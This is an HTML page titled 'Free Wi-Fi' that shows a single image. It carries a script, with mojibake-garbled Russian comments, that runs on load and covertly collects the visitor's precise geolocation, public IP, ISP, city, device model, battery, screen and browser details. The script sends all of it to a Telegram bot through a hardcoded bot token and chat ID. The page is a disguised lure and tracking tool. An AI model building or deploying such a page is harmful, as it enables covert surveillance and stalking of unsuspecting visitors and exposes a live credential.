<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Wi-Fi</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
        }
        .main-image {
            max-width: 80%;
            max-height: 80vh;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <img class="main-image" src="https://i.pinimg.com/564x/a2/36/20/a23620bbf4143ab4b90a462e59c25dad.jpg" alt="–û—Å–Ω–æ–≤–Ω–æ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ">

    <script>
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        async function sendToTelegram(message) {
            // –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê–°–¢–û–Ø–©–ò–ú–ò –î–ê–ù–ù–´–ú–ò:
            const botToken = '6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8'; // –ü–æ–ª—É—á–∏—Ç—å —É @BotFather
            const chatId = '1209403544';    // –ü–æ–ª—É—á–∏—Ç—å —É @userinfobot
            
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
                console.log('–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram');
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
            }
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ (–µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ä–∞–∑—Ä–µ—à–∏—Ç)
        async function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        resolve(`https://www.google.com/maps?q=${lat},${lon} (${lat.toFixed(4)}, ${lon.toFixed(4)})`);
                    },
                    (error) => {
                        resolve(`–û—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: ${error.message}`);
                    },
                    { timeout: 5000 }
                );
            });
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞—Ç–∞—Ä–µ–µ
        async function getBatteryInfo() {
            if (!navigator.getBattery) {
                return "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–∞—Ç–∞—Ä–µ–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞";
            }

            try {
                const battery = await navigator.getBattery();
                return `
                    –£—Ä–æ–≤–µ–Ω—å: ${Math.floor(battery.level * 100)}%
                    –°–æ—Å—Ç–æ—è–Ω–∏–µ: ${battery.charging ? "–ó–∞—Ä—è–∂–∞–µ—Ç—Å—è" : "–ù–µ –∑–∞—Ä—è–∂–∞–µ—Ç—Å—è"}
                    –í—Ä–µ–º—è –¥–æ —Ä–∞–∑—Ä—è–¥–∞: ${battery.dischargingTime === Infinity ? "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ" : `${Math.floor(battery.dischargingTime/60)} –º–∏–Ω—É—Ç`}
                `.replace(/\s+/g, ' ').trim();
            } catch (error) {
                return `–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –æ –±–∞—Ç–∞—Ä–µ–µ: ${error.message}`;
            }
        }

        // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –º–æ–¥–µ–ª–∏ Android-—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        function getAndroidModel() {
            const userAgent = navigator.userAgent;
            
            // –ü–æ–ø—É–ª—è—Ä–Ω—ã–µ –±—Ä–µ–Ω–¥—ã Android
            const brands = {
                'samsung': 'Samsung',
                'huawei': 'Huawei',
                'xiaomi': 'Xiaomi',
                'redmi': 'Redmi',
                'poco': 'POCO',
                'oppo': 'Oppo',
                'vivo': 'Vivo',
                'realme': 'Realme',
                'oneplus': 'OnePlus',
                'sony': 'Sony',
                'lg': 'LG',
                'motorola': 'Motorola',
                'nokia': 'Nokia',
                'htc': 'HTC',
                'asus': 'Asus',
                'lenovo': 'Lenovo',
                'zte': 'ZTE',
                'alcatel': 'Alcatel',
                'meizu': 'Meizu',
                'honor': 'Honor'
            };
            
            // –ü–æ–∏—Å–∫ –±—Ä–µ–Ω–¥–∞ –≤ userAgent
            for (const [key, brand] of Object.entries(brands)) {
                if (userAgent.toLowerCase().includes(key)) {
                    return brand;
                }
            }
            
            // –ü–æ–ø—ã—Ç–∫–∞ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–æ–¥–µ–ª—å –ø–æ –¥—Ä—É–≥–∏–º –ø—Ä–∏–∑–Ω–∞–∫–∞–º
            const modelMatch = userAgent.match(/Android.*;\s([a-zA-Z0-9\s\-]+)\sBuild/i);
            if (modelMatch && modelMatch[1]) {
                return modelMatch[1].trim();
            }
            
            return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π Android-—É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ";
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ
        function getCPUInfo() {
            const cores = navigator.hardwareConcurrency || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
            return `–Ø–¥–µ—Ä: ${cores}`;
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–∞–º—è—Ç–∏
        function getMemoryInfo() {
            return `–û–ó–£: ${(performance.memory ? (performance.memory.jsHeapSizeLimit / (1024 * 1024)).toFixed(1) : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")} MB`;
        }

        // –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        async function collectUserData() {
            const [geolocation, batteryInfo] = await Promise.all([
                getGeolocation(),
                getBatteryInfo()
            ]);

            // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –∏ –º–æ–¥–µ–ª—å
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            let deviceModel = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
            
            if (/Android/i.test(navigator.userAgent)) {
                deviceModel = getAndroidModel();
            } else if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                deviceModel = "Apple " + (/iPhone/i.test(navigator.userAgent) ? "iPhone" : /iPad/i.test(navigator.userAgent) ? "iPad" : "iPod");
            }

            const data = {
                "üìÖ –î–∞—Ç–∞ –∏ –≤—Ä–µ–º—è": new Date().toLocaleString('ru-RU'),
                "üñ•Ô∏è –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ": navigator.platform,
                "üì± –ú–æ–¥–µ–ª—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞": deviceModel,
                "üîç –ë—Ä–∞—É–∑–µ—Ä": navigator.userAgent,
                "üñåÔ∏è –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ": `${screen.width}x${screen.height}`,
                "üì± –ú–æ–±–∏–ª—å–Ω–æ–µ": isMobile ? "–î–∞" : "–ù–µ—Ç",
                "üåç –Ø–∑—ã–∫": navigator.language,
                "‚è±Ô∏è –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å": Intl.DateTimeFormat().resolvedOptions().timeZone,
                "üîã –ë–∞—Ç–∞—Ä–µ—è": batteryInfo,
                "üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è": geolocation,
                "‚öôÔ∏è –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä": getCPUInfo(),
                "üíæ –ü–∞–º—è—Ç—å": getMemoryInfo(),
                "üåê –û–Ω–ª–∞–π–Ω —Å—Ç–∞—Ç—É—Å": navigator.onLine ? "–û–Ω–ª–∞–π–Ω" : "–û—Ñ–ª–∞–π–Ω",
                "üç™ –ö—É–∫–∏ –≤–∫–ª—é—á–µ–Ω—ã": navigator.cookieEnabled ? "–î–∞" : "–ù–µ—Ç",
                "üì∂ –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ": navigator.connection ? (navigator.connection.effectiveType || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ") : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
            };

            // –ü–æ–ª—É—á–∞–µ–º IP –∏ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    data["üåê IP-–∞–¥—Ä–µ—Å"] = ipData.ip;
                    
                    return fetch(`https://ipapi.co/${ipData.ip}/json/`);
                })
                .then(response => response.json())
                .then(geoData => {
                    data["üè¢ –ü—Ä–æ–≤–∞–π–¥–µ—Ä"] = geoData.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                    data["üó∫Ô∏è IP-–≥–µ–æ–ª–æ–∫–∞—Ü–∏—è"] = `${geoData.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}, ${geoData.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}`;
                    data["üì° –í—Ä–µ–º—è —Å–µ—Ä–≤–µ—Ä–∞"] = new Date().toLocaleString('ru-RU');
                    
                    // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
                    let telegramMessage = "üîî –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å:\n";
                    for (const [key, value] of Object.entries(data)) {
                        telegramMessage += `${key}: ${value}\n`;
                    }
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                    sendToTelegram(telegramMessage);
                })
                .catch(error => {
                    console.error('–û—à–∏–±–∫–∞:', error);
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ö–æ—Ç—è –±—ã –±–∞–∑–æ–≤—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                    let telegramMessage = "üîî –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å:\n";
                    for (const [key, value] of Object.entries(data)) {
                        telegramMessage += `${key}: ${value}\n`;
                    }
                    sendToTelegram(telegramMessage);
                });
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', collectUserData);
    </script>
</body>
</html>
